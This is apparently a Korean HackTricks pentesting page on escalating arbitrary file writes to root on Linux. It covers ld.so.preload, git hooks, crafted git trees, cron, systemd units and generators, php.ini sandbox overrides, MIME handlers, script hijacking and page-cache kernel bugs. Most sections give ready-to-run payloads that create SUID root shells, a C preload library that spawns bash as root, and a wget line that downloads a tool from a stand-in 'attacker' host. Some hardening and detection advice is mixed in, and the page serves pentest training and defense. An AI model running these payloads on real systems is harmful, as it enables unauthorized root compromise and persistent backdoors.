# Root에 대한 임의 파일 쓰기

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload`는 동적 링커가 다른 공유 객체보다 먼저 로드하는 공유 객체의 시스템 전체 목록입니다. Secure-execution mode에서는 preloading에 추가 제한이 적용되므로, `/tmp/pe.so`와 같은 라이브러리 경로가 모든 SUID 바이너리에 적용되는 범용 기법은 아닙니다.\
이 파일을 만들거나 수정할 수 있다면, 이 파일을 로드하는 프로세스는 여기에 지정된 라이브러리를 다른 공유 객체보다 먼저 로드하므로 해당 프로세스의 컨텍스트에서 코드를 실행할 수 있습니다.<sup>[[12]](#references)</sup>

예: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### 제약된 파일 쓰기로서의 OCR 출력

호출자가 저장할 파일명을 선택할 수 있는 OCR 서비스는 인식한 이미지 텍스트를 **제약된 파일 쓰기** primitive로 바꿀 수 있습니다. 저장되는 바이트는 이미지 바이트가 아니라 인식된 텍스트이므로 OCR 출력에 구문 오류가 있는지 확인하세요. 허용된 대상이 웹에서 실행 가능하고 `.php` 파일명을 허용한다면, 해당 텍스트는 요청될 때 실행될 수 있습니다. MakeSense에서는 로컬에서 접근 가능한 OCR 애플리케이션이 텍스트를 `/saved/` 아래에 저장했고, root로 실행되는 PHP 서버가 저장된 파일을 root 권한으로 실행했습니다. 쓰기는 해당 디렉터리로 제한되었으며, path traversal은 입증되지 않았습니다.<sup>[[37]](#references)</sup>

실행 시 획득하는 권한은 **PHP를 제공하는 프로세스**의 권한이지, OCR writer의 권한이 자동으로 적용되는 것은 아닙니다. 대상의 실행 매핑과 런타임 ID를 확인하세요. root 권한의 OCR writer와 권한이 낮은 웹 서버가 함께 있다고 해서 PHP가 root 권한으로 실행되는 것은 아닙니다.<sup>[[37]](#references)</sup> 직접적인 [web-root 업로드 패턴](../../pentesting-web/file-upload/)과 비교하세요.

### Git hooks

**Git hooks**는 commit 및 merge 작업을 포함하여 저장소에서 이벤트가 발생할 때 실행되는 스크립트입니다. **권한이 있는 스크립트나 사용자**가 이러한 작업을 수행하고 공격자가 **`.git` 폴더에 쓰기**를 할 수 있다면, hook을 **권한 상승**에 이용할 수 있습니다.<sup>[[13]](#references)</sup>

예를 들어, 새 commit이 생성될 때마다 실행되도록 git 저장소의 **`.git/hooks`**에 **스크립트를 생성**할 수 있습니다:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Privileged Git tree export 경로 순회

Privileged synchronizer는 checkout을 하지 않고, 공격자가 영향을 줄 수 있는 repository를 `git ls-tree`로 열거한 뒤 `git cat-file`로 각 blob을 읽고, 보고된 경로명을 staging directory에 결합해 직접 쓸 수 있습니다. `-c safe.directory=*`(서로 다른 소유자의 repository에 대한 Git의 보호 기능 비활성화)를 사용하면서 대상 경로가 지정된 디렉터리 내부인지 검사하지 않으면, **synchronizer의 권한으로 임의 파일 쓰기**가 가능합니다. 절대 경로인 tree-entry 이름은 Python의 `os.path.join(stage, name)`에서 `stage`를 무시하게 만들고, `../`가 포함된 상대 경로는 파일 시스템에서 경로를 해석할 때 지정된 디렉터리를 벗어나게 합니다. 애플리케이션이 Git에 checkout을 요청하는 대신 raw tree를 파일로 만들기 때문에, checkout 시점의 경로명 거부 기능은 파일 쓰기 대상 경로를 보호하지 못합니다.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

root 서비스, 타이머, 배포 에이전트, 템플릿 가져오기 도구, 백업/복원 작업에서 다음과 같은 코드 형태를 찾아보세요:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

트리 항목은 `<mode> SP <name> NUL <raw object ID>` 형식으로 인코딩됩니다. `git hash-object --literally` 옵션은 일반적인 파싱이나 `git fsck`에서 거부될 수 있는 객체 데이터를 의도적으로 허용하므로, 일회용 clone에서 파일명이 절대 경로인 트리를 만들 수 있습니다. 이 예제에서는 cron 파일 blob을 만들고, 조작한 트리를 commit으로 감싼 다음 브랜치를 해당 commit으로 이동합니다. 악용하려면 특권 작업에서 사용하는 저장소를 업데이트할 권한과 잘못된 형식의 객체를 허용하는 Git 서버가 필요합니다.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Hardening은 repository 수집과 최종 파일시스템 작업을 모두 다뤄야 합니다:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*`를 서비스가 신뢰해야 하는 정확한 repository 목록으로 바꾸고, 가능한 경우 root 권한 없이 repository를 처리합니다.
- 파일을 배치하기 전에 절대 경로 이름과 `.` 또는 `..` 구성 요소를 거부합니다. 경로를 결합한 뒤 정규화하고 대상이 의도한 루트 아래에 있는지 확인합니다.
- 확인 후 파일을 여는 방식에서 발생하는 symlink 경쟁 조건을 피합니다. 신뢰할 수 있는 디렉터리 파일 디스크립터를 기준으로 열고, Linux에서는 공격자가 제어하는 경로에 `RESOLVE_BENEATH`와 `RESOLVE_NO_SYMLINKS`를 함께 사용해 `openat2()`를 호출합니다.
- plumbing 출력으로 checkout을 재구현하는 대신 격리된 디렉터리에서 일반 checkout을 수행합니다. raw-object 수집이 필요하다면 `receive.fsckObjects=true` 같은 수신 측 검증을 활성화하고, 조작된 tree를 거부하는 데 필요한 경로명 관련 `receive.fsck.*` 항목의 검사를 완화하지 않습니다.

### 권한 상승된 구성 배포

일부 관리 서비스는 의도한 시스템 상태를 구성 파일에 저장하고 나중에 권한을 높여 배포합니다. 예를 들어, [openmediavault stores configuration in `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html)이며, 해당 [RPC interface](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html)는 서비스 변경 사항을 적용할 수 있습니다. 권한이 낮은 계정이 해당 파일을 쓰거나 교체할 수 있다면, 승인된 배포도 요청할 수 있는지, 선택된 모듈이 변경된 필드를 root 권한으로 사용하는지도 확인합니다. SSH 계정 키, 예약 명령, 패키지 설치에는 각각 서로 다른 전제 조건이 있습니다. 파일이 존재하거나 XML 파일을 쓸 수 있다는 사실만으로 어느 것도 입증되지 않습니다. 파일 및 상위 디렉터리 권한, 호출자의 그룹과 RPC 권한 부여, 설치된 버전, 실제 소비자를 확인하되, 열거 중에는 구성을 수정하거나 적용 작업을 호출하지 않습니다.

`/etc/fail2ban/action.d/`의 Fail2Ban action 정의도 권한이 높은 구성 경계입니다. 해당 디렉터리를 쓰고 검색할 수 있는 사용자는 action 정의를 교체하거나 override를 추가할 수 있지만, 디렉터리 권한만으로 code execution이 입증되지는 않습니다. 활성화된 jail이 실제로 영향을 받는 action을 선택하는지, Fail2Ban 서비스가 더 높은 권한으로 이를 실행하는지, 그리고 승인된 reload/restart 후 조건에 맞는 ban 이벤트가 발생할지 확인합니다. Fail2Ban을 재시작할 수 있는 관련 없는 sudo 권한은 정확히 해당 서비스 호출에 적용되고 변경된 정의가 로드되는 경우에만 관련이 있습니다. [Fail2Ban's action configuration](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5)은 action 디렉터리와 jail의 관계를 설명하고, [sample action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf)은 ban 시 `actionban`이 서비스 사용자의 권한으로 실행됨을 보여줍니다. 열거 중에는 action을 변경하거나 ban을 유발하지 말고 권한과 유효 구성을 검사합니다.

활성화된 Fail2Ban jail이 WHOIS 정보를 추가하는 mail action을 사용하는 경우에도 별도의 경계가 존재합니다. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm)는 신뢰할 수 없는 WHOIS 텍스트를 GNU mailutils `mail`로 파이프했고, 해당 프로그램의 escape 처리가 명령을 실행할 수 있었던 문제입니다. 권한이 낮은 파일 작성자가 **선택된 WHOIS 클라이언트**의 서버 재정의 구성을 변경할 수 있다면 응답에 영향을 줄 수 있습니다. [Debian's `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html)은 해당 파일의 한 예를 설명하지만, 경로와 사용 방식은 설치 환경에 따라 다릅니다. 유효한 jail/action, 서비스의 실행 사용자, 실제 WHOIS 클라이언트와 구성 경로, mail 구현체, 응답 제어 가능성, 설치된 공급업체 수정 또는 backport를 확인합니다. WHOIS 구성 파일을 쓸 수 있다는 사실이나 Fail2Ban 버전 또는 mail action만으로는 이 공격 경로가 입증되지 않습니다. 수동 열거 중에는 외부 서버에 질의하거나 ban을 유발하지 않습니다.

### TFTP 파일 생성 및 권한이 높은 패키지 hook

접근 가능한 TFTP 서비스는 **유효한** tftpd-hpa 설정이 root로 실행되고, 파일시스템 루트를 `--secure` 디렉터리로 노출하며, `--create`를 활성화한 경우 컨테이너 또는 로컬 사용자 경계를 넘을 수 있습니다. [The tftpd-hpa manual](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html)은 파일 생성 및 사용자 옵션을 설명합니다. 이 설정은 `/etc/apt/apt.conf.d/`를 포함해 권한이 높은 구성 디렉터리에 새 파일을 생성하는 데 활용될 수 있지만, 기존 파일은 여전히 교체되지 않을 수 있습니다. [APT's configuration manual](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html)은 `APT::Update::Pre-Invoke` 명령을 설명합니다. root로 실행되는 `apt update`는 새 구성 파일을 읽는 경우에만 더 높은 권한의 소비자가 될 수 있습니다. 실행 중인 데몬의 실제 인수와 실행 사용자, 네트워크 접근성 및 필터링, 대상 디렉터리의 파일 생성 정책, APT의 유효 구성 범위, 이후 권한이 높은 호출이 있는지 확인합니다. 기본 설정 파일이나 쓰기 가능한 대상 디렉터리 또는 예약된 APT 명령만으로 전체 경로가 입증되지는 않습니다. 수동 triage에서는 파일을 업로드하거나 APT를 실행하지 말고, 로컬 구성 및 메타데이터를 제한된 범위에서만 읽습니다.

### Cron 및 시간 관련 파일

root가 실행하는 cron 관련 파일을 **쓸 수 있다면**, 보통 다음 작업 실행 시 code execution을 얻을 수 있습니다. 확인할 만한 대상은 다음과 같습니다:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` 또는 `/var/spool/cron/crontabs/`에 있는 root의 crontab
- `systemd` timers 및 해당 timer가 실행하는 services

빠른 점검:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

일반적인 악용 경로:

- `/etc/crontab` 또는 `/etc/cron.d/`의 파일에 **새 root cron job 추가**
- `run-parts`가 이미 실행하는 스크립트 **교체**
- 실행되는 스크립트나 바이너리를 수정해 **기존 timer target에 백도어 삽입**

최소 cron payload 예시:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

`run-parts`가 사용하는 cron 디렉터리에만 쓸 수 있다면, 대신 그곳에 실행 파일을 넣으세요:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

메모:

- `run-parts`는 보통 점이 포함된 파일 이름을 무시하므로 `backup.sh` 대신 `backup` 같은 이름을 사용하세요.<sup>[[15]](#references)</sup>
- 일부 시스템은 기존 cron 대신 `systemd` 타이머를 사용하지만, 악용 아이디어는 같습니다. **root가 나중에 실행할 항목을 수정하세요**.<sup>[[20]](#references)</sup>

### Service 및 Socket 파일

**`systemd` unit 파일**이나 해당 파일에서 참조하는 파일에 쓸 수 있다면, unit을 다시 로드하고 재시작하거나 서비스/socket 활성화 경로가 트리거될 때까지 기다려 root 권한으로 코드를 실행할 수 있습니다.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

ACL을 포함해 시스템 unit 디렉터리 자체에 대한 쓰기 및 검색 권한도 확인하세요. 디렉터리 읽기/목록 권한이 거부되어도 사용자가 `/etc/systemd/system`에 새 unit을 만들 수 있습니다. 하지만 이 경로만으로는 아무것도 시작되지 않습니다. 시스템 관리자가 새 unit을 로드하는지, 호출자에게 해당 이름에 대해 root 권한으로 실행 가능한 `systemctl start` 또는 `restart` 권한(또는 다른 특권 활성화 경로)이 실제로 부여되어 있는지, 서비스가 의도한 사용자 ID로 실행되는지 확인하세요. 디스크에서 변경한 기존 로드 unit은 `daemon-reload`가 필요할 수 있으며, 새 이름의 unit은 로드 동작이 다릅니다. 와일드카드 restart 규칙만으로 충분하다고 판단하기 전에 sudo 인수와 제외 조건을 정확히 검토하세요. [systemd unit 검색 경로](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html)와 [systemctl 로드 및 reload 동작](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html)를 참고하세요.

주목할 만한 대상:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf`의 drop-in 재정의 파일
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`에서 참조하는 서비스 스크립트/바이너리
- root 서비스가 로드하는 쓰기 가능한 `EnvironmentFile=` 경로

빠른 확인:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

일반적인 악용 경로:

- 수정할 수 있는 root 소유 서비스 유닛에서 **`ExecStart=` 덮어쓰기**
- 악성 `ExecStart=`가 포함된 **drop-in override 추가** 후 기존 항목 먼저 지우기
- 유닛에서 이미 참조하는 스크립트/바이너리에 **백도어 삽입**
- 소켓이 연결을 받으면 시작되는 해당 `.service` 파일을 수정해 **socket-activated service 가로채기**

악성 override 예시:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

일반적인 활성화 흐름:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

서비스를 직접 재시작할 수 없더라도 socket-activated unit을 수정할 수 있다면, 클라이언트 연결이 발생할 때까지 **기다리기만 하면** 백도어가 삽입된 서비스가 root 권한으로 실행될 수 있습니다.<sup>[[17]](#references)</sup>

### systemd generator 디렉터리

**System generators**는 system manager가 unit 파일을 로드하기 전에 실행되는 실행 파일로, 부팅 중과 설정을 다시 로드할 때 모두 실행됩니다. 따라서 system-generator 디렉터리(또는 기존 실행 파일인 generator)에 대한 쓰기 권한은 간과하기 쉬운 직접적인 root 코드 실행 수단입니다. 특히 감사 과정에서 `*.service`와 `*.timer` 파일만 확인하는 경우 그렇습니다.<sup>[[35]](#references)[[36]](#references)</sup>

일반적인 검색 순서는 `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/`, `/usr/lib/systemd/system-generators/`입니다(일부 배포판에서는 `/usr` 병합을 통해 `/lib/systemd/system-generators/`가 노출됩니다). 앞선 디렉터리에 같은 이름의 실행 파일이 있으면 뒤의 실행 파일을 가립니다. 이 **입력 실행 파일 디렉터리**와 generator가 생성한 임시 unit 출력이 들어 있는 `/run/systemd/generator`, `/run/systemd/generator.early`, `/run/systemd/generator.late`를 혼동하지 마세요.<sup>[[35]](#references)</sup>

빠른 확인:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

새로 생성한 generator에는 executable bit가 설정되어 있어야 합니다. write primitive으로 바이트는 제어할 수 있지만 mode는 제어할 수 없다면, 이미 executable인 generator를 대상으로 하세요. 해당 파일을 직접 truncate하면 일반적으로 메타데이터가 유지됩니다. 디렉터리 자체에 쓰기 권한이 있다면 새 항목을 만들고 executable로 표시하세요.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

`systemctl daemon-reload`를 **system** manager 대상으로 실행하려면 적절한 권한이 필요하지만, 실행하면 모든 system generator가 다시 실행됩니다. 그렇지 않으면 권한이 있는 reload, package 작업 또는 reboot를 기다리세요. `~/.config/systemd/user-generators/`와 같은 user-generator 디렉터리는 user manager에서 실행되며, 그 자체로는 root 권한을 제공하지 **않습니다**.<sup>[[35]](#references)</sup>

보안 강화 및 위협 탐지를 위해서는 마지막 mode bits만 확인하지 말고 모든 경로 구성 요소와 ACL을 확인하고, generator의 해시 및 package 소유권을 기준선으로 설정하며, 모든 system-generator 입력 디렉터리에서 생성, 이름 변경, 콘텐츠 또는 권한 변경을 감지하도록 알림을 설정하세요. one-shot generator는 실행 후 스스로 삭제할 수 있고, `/run/systemd/generator*` 아래의 생성된 unit 트리는 다음 reload 때 다시 만들어지므로 쓰기 동작을 모니터링하는 것이 중요합니다.<sup>[[35]](#references)[[36]](#references)</sup>

### 권한이 제한된 PHP sandbox에서 사용하는 `php.ini` 덮어쓰기

일부 custom daemon은 **제한된 `php.ini`**(예: `disable_functions=exec,system,...`)를 사용해 `php`를 실행하여 사용자가 제공한 PHP를 검증합니다. sandbox된 코드에 `file_put_contents`와 같은 **쓰기 primitive**가 **하나라도** 있고 daemon에서 사용하는 **정확한 `php.ini` 경로**에 접근할 수 있다면, **해당 설정을 덮어써서** 제한을 해제한 다음, elevated privileges로 실행되는 두 번째 payload를 제출할 수 있습니다.<sup>[[2]](#references)</sup>

일반적인 흐름:

1. 첫 번째 payload가 sandbox 설정을 덮어씁니다.
2. 위험한 함수가 다시 활성화되면 두 번째 payload가 코드를 실행합니다.

최소 예제(daemon에서 사용하는 경로로 바꾸세요):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

데몬이 root로 실행되거나 root 소유 경로를 기준으로 검증한다면, 두 번째 실행은 root 컨텍스트를 얻게 됩니다. 이는 sandboxed runtime이 여전히 파일을 쓸 수 있을 때 발생하는 **config overwrite를 통한 privilege escalation**입니다.

### binfmt_misc

`binfmt_misc`는 `/proc/sys/fs/binfmt_misc` 아래에 등록 정보를 노출하며, 각 등록 항목은 파일 유형 패턴을 인터프리터와 연결합니다. 권한에 미치는 영향은 누가 등록 정보를 변경할 수 있는지, 그리고 이후 어떤 프로세스가 일치하는 파일을 실행하는지에 따라 달라집니다. 따라서 이를 privilege escalation 경로로 판단하기 전에 해당 조건을 확인하세요.<sup>[[21]](#references)</sup>

`CAP_DAC_OVERRIDE`가 있는 실행 가능한 helper가 호출자가 제어하는 데이터를 받아 `/proc/sys/fs/binfmt_misc/register`에 쓰는 경우, 호출자가 해당 노드에 직접 쓸 수 없더라도 별도의 등록 경로가 될 수 있습니다. 열거 과정에서 helper를 실행하지 말고 입력 처리 방식과 쓰기 동작을 검토하세요. 등록된 규칙이 `C` 플래그를 사용하면 인터프리터는 일치하는 바이너리를 기준으로 한 자격 증명을 받습니다. 따라서 root 소유 SUID 대상과 일치하면 호출자가 제어하는 인터프리터가 root로 실행될 수 있습니다. `binfmt_misc` 마운트 및 등록 정책, helper의 유효 capability, 정확한 규칙과 인터프리터 경로, 실행 가능한 SUID 대상, 그리고 `no_new_privs` 또는 `nosuid` 마운트가 SUID 전환을 억제하는지 확인하세요. capability 비트나 포함된 경로 문자열만으로는 검토의 단서일 뿐입니다.<sup>[[21]](#references)</sup> SUID 억제 조건은 [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html)를 참조하세요.

### 스키마 핸들러 덮어쓰기(http: 또는 https: 등)

Desktop 환경은 MIME 연결 및 desktop entry를 사용해 URI 스킴을 처리할 애플리케이션을 선택합니다. 관련 사용자별 설정 디렉터리와 desktop-entry 디렉터리에 쓸 수 있는 공격자는 해당 스킴이 자신이 제어하는 launcher를 실행하도록 바꿀 수 있습니다. `$HOME/.config/mimeapps.list` 파일에서 HTTP 및 HTTPS URL 핸들러가 악성 파일을 가리키도록 수정하면(예: `x-scheme-handler/http=evil.desktop` 및 `x-scheme-handler/https=evil.desktop`), 사용자가 클릭했을 때 해당 desktop entry가 실행될 수 있습니다.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### 사용자 쓰기 가능 스크립트/바이너리를 실행하는 root

권한이 높은 workflow가 `/bin/sh /home/username/.../script`와 같은 명령을 실행하거나, 비권한 사용자가 소유한 디렉터리 안의 바이너리를 실행하면 이를 hijack할 수 있습니다:<sup>[[1]](#references)</sup>

- **실행 감지:** pspy로 프로세스를 모니터링해 root가 사용자 제어 경로를 호출하는지 확인합니다.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **쓰기 가능 여부 확인:** 대상 파일과 해당 디렉터리의 소유자가 본인인지 확인하고, 본인이 쓸 수 있는지 확인합니다.
- **대상 Hijack:** 원본 바이너리/스크립트를 백업하고, SUID shell(또는 다른 root 작업)을 생성하는 payload를 넣은 다음 권한을 복원합니다:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **privileged action을 트리거합니다** (예: helper를 실행하는 UI 버튼 누르기). root가 hijacked path를 다시 실행하면 `./rootshell -p`로 권한이 상승된 shell을 가져옵니다.

### privileged binary의 page-cache-only 파일 수정

일부 kernel 버그는 **디스크상의** 파일을 수정하지 않습니다. 대신 읽을 수 있는 파일의 **page cache 복사본**만 수정할 수 있게 합니다. **setuid** 또는 그 밖의 방식으로 **root가 실행하는** binary를 대상으로 삼을 수 있다면, 다음 실행 시 디스크에 있는 파일 hash는 그대로인데도 메모리에 있는 공격자 제어 바이트가 실행되어 권한이 상승할 수 있습니다.<sup>[[3]](#references)[[4]](#references)</sup>

이를 **runtime-only file write primitive**로 생각하면 유용합니다.<sup>[[3]](#references)</sup>

- **디스크는 깨끗한 상태 유지**: inode와 디스크상의 바이트는 바뀌지 않음
- **메모리는 오염됨**: 캐시된 페이지를 읽거나 실행하는 프로세스는 공격자가 수정한 콘텐츠를 가져옴
- **효과는 일시적**: 재부팅하거나 cache에서 페이지가 제거되면 변경 사항이 사라짐

이 primitive는 기존의 **arbitrary file write**와 Dirty COW / Dirty Pipe 같은 과거 **page-cache abuse** 버그 사이에 있습니다.<sup>[[3]](#references)</sup>

- Dirty COW는 race에 의존함
- Dirty Pipe에는 write-position 제약이 있었음
- 취약한 경로에서 cache에 있는 file-backed 페이지에 직접 쓸 수 있다면 page-cache-only primitive가 더 안정적일 수 있음

#### 일반적인 privesc 흐름

1. **file-backed page cache pages**에 쓸 수 있는 kernel primitive를 확보합니다
2. 이를 **읽을 수 있는 privileged binary** 또는 root가 실행하는 다른 파일에 사용합니다
3. 페이지가 cache에서 제거되기 **전에** 실행을 트리거합니다
4. 디스크상의 파일은 수정되지 않은 것처럼 보이는 상태로 root 권한의 code execution을 얻습니다

일반적으로 가치가 높은 대상:

- **setuid-root** binary
- **root services**가 실행하는 helper
- **host kernel/page cache를 공유하는 containers**에서 흔히 실행되는 binary

#### AF_ALG + `splice()` 예시 경로

Copy Fail (CVE-2026-31431)은 이 유형의 좋은 예입니다. 취약한 경로는 Linux crypto userspace API (`AF_ALG` / `algif_aead`)에 있었습니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`는 읽을 수 있는 파일의 page-cache 페이지에 대한 참조를 crypto TX scatterlist로 옮길 수 있음
- in-place `algif_aead` decrypt 경로는 source 및 destination buffer를 재사용함
- 이후 `authencesn`이 destination tag 영역에 씀
- 해당 영역이 여전히 spliced file-backed 페이지를 참조하고 있으면, 쓰기가 대상 파일의 **page cache**에 적용됨

따라서 주목할 기법은 CVE 자체가 아니라 다음 패턴입니다.

- file-backed cache 페이지를 kernel subsystem에 **전달**
- subsystem이 해당 페이지를 **쓰기 가능한 출력으로 취급**하게 함
- 메모리에서 통제 가능한 작은 덮어쓰기를 트리거

공개 PoC는 반복적인 **4-byte write**를 사용해 `/usr/bin/su`를 메모리에서 패치한 뒤 실행했습니다.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone 예시 경로

DirtyClone (CVE-2026-43503)은 같은 **page-cache-only write-to-root** 패턴의 또 다른 변형을 보여줍니다. 다만 이번에는 sink가 `AF_ALG`가 아니라 **IPsec ESP decrypt**입니다.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

중요한 기법은 **metadata-laundering 단계**입니다.

- `splice()`가 **읽기 전용 file-backed page-cache 페이지**를 ESP-in-UDP packet에 배치함
- 기존 DirtyFrag mitigation은 `SKBFL_SHARED_FRAG`로 해당 skb에 tag를 지정해 `esp_input()`이 decrypt 전에 **복사하도록** 했음
- netfilter `TEE`가 `nf_dup_ipv4()` -> `__pskb_copy_fclone()`을 통해 packet을 복제함
- clone은 **동일한 물리 page-cache 참조**를 유지하지만 `SKBFL_SHARED_FRAG`는 잃음
- 그러면 `esp_input()`은 clone이 안전하다고 간주하고 file-backed 페이지에서 **in-place `cbc(aes)` decrypt**를 수행함

따라서 검토자가 얻을 교훈은 CVE보다 더 광범위합니다. mitigation이 **skb/page metadata**를 기반으로 먼저 복사할지 결정한다면, backing page는 유지하면서 metadata는 제거하는 모든 **clone/copy 경로**가 write primitive를 조용히 다시 열 수 있습니다.

일반적인 exploitation 흐름:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`를 사용해 **private network namespace 안에서 `CAP_NET_ADMIN`을 확보**
2. loopback을 활성화하고 `mangle/OUTPUT`에 **netfilter `TEE` rule**을 설치
3. `NETLINK_XFRM`을 통해 **XFRM ESP transport SA**를 설치
4. 각 대상 4-byte word를 SA `seq_hi` field에 인코딩 (DirtyFrag의 word-selection 기법)
5. spliced ESP-in-UDP packet을 전송해 **TEE clone**이 `esp_input()`에 도달하고 **in-place decrypt**를 수행하도록 함
6. `/usr/bin/su` 또는 다른 privileged executable의 page-cache 복사본에 공격자 제어 code가 들어갈 때까지 반복

실제 영향은 `AF_ALG` 예시와 같습니다. 디스크상의 파일은 깨끗한 상태로 유지되지만 `execve()`가 **수정된 page-cache 바이트**를 사용해 root 권한을 제공합니다.<sup>[[8]](#references)[[9]](#references)</sup>

이 변형의 노출 여부를 확인하는 데 유용한 항목:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

단기적인 attack-surface 축소도 여기서는 경로별로 다릅니다. `48f6a5356a33`가 포함된 kernel로 업그레이드하면 clone 경로가 수정되고, `xt_TEE` 자동 로드를 차단하면 **flag-laundering 단계**가 제거되며, `esp4` / `esp6`를 차단하면 **복호화 sink**가 제거됩니다.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### 노출 여부 확인 및 탐색

이 유형의 버그가 의심된다면 디스크 무결성 검사만으로 판단하지 마세요. 다음 항목도 확인하세요:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

아래 구성 값은 로드 가능한 인터페이스와 커널에 내장된 인터페이스를 구분합니다. crypto 빌드 규칙은 `CONFIG_CRYPTO_USER_API_AEAD`를 `algif_aead`에 매핑합니다.<sup>[[26]](#references)[[27]](#references)</sup>

